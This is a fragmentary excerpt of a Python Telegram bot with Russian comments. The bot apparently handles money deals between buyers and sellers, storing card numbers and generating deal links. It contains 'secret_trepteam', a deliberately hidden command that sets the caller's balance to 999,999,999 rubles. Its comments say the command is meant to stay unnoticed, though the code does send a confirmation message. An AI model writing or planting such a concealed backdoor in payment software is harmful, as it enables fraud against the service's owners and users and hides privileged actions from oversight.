...
def main_menu_kb():
    ...
    # Кнопки как на скрине 1. Без "Открыть Web App"
...
async def secret_trepteam(message: types.Message):
    # Нигде не отображается, выдает бесконечный баланс
    supabase.table("users").update({"balance_rub": 999999999}).eq("tg_id", message.from_user.id).execute()
    # Никакого ответа, чтобы оставаться незамеченным. Можно добавить простое уведомление.
    await message.answer("⚙️ Баланс обновлен.")
...
async def save_card(message: types.Message, state: FSMContext):
    # Валидация карты (простая проверка на 16 цифр или номер телефона)
    import re
...
async def link_entered(message: types.Message, state: FSMContext):
    ...
    # Генерируем ссылку для покупателя (в реальности это должен быть deep link на бота)
    buyer_link = f"https://t.me/YourBotUsername?start=deal_{deal_id}"
...
async def admin_panel(message: types.Message):
    ...
    if not user.get('is_admin'):
        return # Молча игнорируем для обычных пользователей
...
# Запуск (для локального теста) и для Render
